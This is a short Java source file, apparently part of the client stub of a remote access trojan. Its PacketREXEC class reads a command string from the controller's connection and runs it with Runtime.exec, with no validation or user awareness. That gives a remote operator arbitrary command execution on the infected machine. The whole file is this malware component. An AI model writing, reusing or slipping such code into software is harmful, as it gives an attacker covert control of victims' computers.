package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;

public class PacketREXEC extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String process = Connection.readLine();
		try {
			Runtime.getRuntime().exec(process);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
